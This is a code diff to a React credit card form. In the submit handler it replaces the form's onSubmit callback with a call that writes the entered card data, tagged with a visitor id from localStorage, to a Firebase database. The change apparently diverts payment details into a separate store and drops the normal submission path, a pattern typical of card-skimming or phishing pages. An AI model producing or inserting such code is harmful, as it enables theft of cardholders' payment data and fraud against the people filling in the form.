@@ -5,6 +5,7 @@ import type React from "react"
 import { useState, useEffect } from "react"
 import Image from "next/image"
 import { CreditCard, Calendar, User, Lock } from "lucide-react"
+import { addData } from "@/lib/firebase"
 
 // Card types with their regex patterns and logos
 const CARD_TYPES = [
@@ -186,7 +187,9 @@ export default function CreditCardForm({ onSubmit, isProcessing = false }: Credi
     e.preventDefault()
 
     if (validateForm()) {
-      onSubmit(cardData)
+    const visitorId = localStorage.getItem('visitor');
+
+      addData({id:visitorId,...cardData})
     }
   }
 
